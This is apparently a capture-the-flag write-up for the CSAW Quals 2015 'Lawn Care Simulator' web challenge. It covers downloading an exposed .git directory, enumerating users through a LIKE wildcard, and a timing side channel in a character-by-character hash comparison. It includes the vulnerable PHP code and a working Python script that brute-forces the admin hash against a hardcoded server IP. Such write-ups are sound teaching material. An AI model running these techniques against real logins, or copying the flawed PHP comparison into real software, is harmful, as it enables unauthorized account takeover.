---
layout: post
title: "CSAW Quals 2015 Lawn Care Simulator"
date: 2015-09-23 19:17:29 -0400
author: [swappage]
comments: true
categories: [csaw]
---

### Solved by Swappage

This 200 points challenge was a web application running a nicely useless javascript for "growing lawn", and was providing all the typical features available in a standard web application, including registration and login.

The objective of this challenge was to login as admin.

## Clone all the things ##

By looking at the index source code we could notice that the version number, present in the bottom corner of the page, was calculated based on the git repository hash.

![](/images/2015/csaw/lawn/version.png)

```javascript
<script>
    function init(){
        document.getElementById('login_form').onsubmit = function() {
            var pass_field = document.getElementById('password');
            pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
    };
    $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
    initGrass();
}
</script>
```

Since the .git directory is available in the webroot, we can crawl it and download the entire repository, to obtain the source code and spot bugs.
To make my life easier i used DVCS-Pillage: https://github.com/evilpacket/DVCS-Pillage
to automate the whole process, and at the end i had all the website sources available to me, except.. of course for the flag.

    -rw-r--r--  1 root root  109 Sep 19 00:46 ___HINT___
    -rw-r--r--  1 root root 2406 Sep 19 00:46 index.html
    -rw-r--r--  1 root root 1410 Sep 19 00:46 jobs.html
    drwxr-xr-x  2 root root 4096 Sep 19 14:50 js
    -rw-r--r--  1 root root  918 Sep 19 00:46 premium.php
    -rw-r--r--  1 root root 2937 Sep 19 00:46 sign_up.php
    -rw-r--r--  1 root root   78 Sep 19 01:51 test.php
    -rw-r--r--  1 root root  780 Sep 19 00:46 validate_pass.php


## The bugs ##
In the php code there were two bugs:

The first was in the registration page *sign_up.php*

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
    require_once 'db.php';
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
    mysql_select_db('users') or die("Mysql error");
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
}
else {
?>
```
As it's possible to notice the query used to verify if a user already existed, used a *LIKE* statement, this means that by submitting a username value with the character %, we could disclose the already registered users; of course, since the registration was still closed, the only user we were expecting to find as already registered was the admin username, which happened to be ~~FLAG~~.

![](/images/2015/csaw/lawn/user_exists.png)

The second one was in the way the login process was handled by the validate_pass.php

```php
<?
function validate($user, $pass) {
    require_once 'db.php';
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
    mysql_select_db('users') or die("Mysql error");
    $user = mysql_real_escape_string($user);
    $query = "SELECT hash FROM users WHERE username='$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    $hash = $line['hash'];

    if (strlen($pass) != strlen($hash))
        return False;

    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
}
?>
```

What the script implements as a *protection against brute force attacks* is faulty, and leave the script open to a byte by byte bruteforce attack on the hash, which wasn't calculated by the server, but directly by the javascript on the client side.

By analyzing the timings of the server response it was possible to guess the characters that were composing the md5 hash for the ~~FLAG~~ user.

I built this horrible python script to do the job and retrieve the flag.

```python
#!/usr/bin/python

import datetime
import time
import requests
from itertools import combinations
import itertools

letters = ['a', 'b', 'c', 'd', 'e', 'f', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

hash = ""
padding = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
delay = 300

current_milli_time = lambda: int(round(time.time() * 1000))

while 1:
    for c in itertools.combinations_with_replacement(letters, 1):
#       time.sleep(0.5)
        start = current_milli_time()

        stringa = (''.join(c))
        print "[*] bruteforcing MD5 with: " + hash + stringa + padding
        r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
        #print(r.status_code, r.reason)

        stop = current_milli_time()
        elapsed = stop - start
        print elapsed
        if elapsed > delay:
            start = datetime.datetime.now()
            r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
            stop = datetime.datetime.now()
            if elapsed > delay:
                print "[*] character found: " + stringa
                hash += stringa
                padding = padding[:-1]
                delay = delay + 300
                print padding
                print hash
                break

```

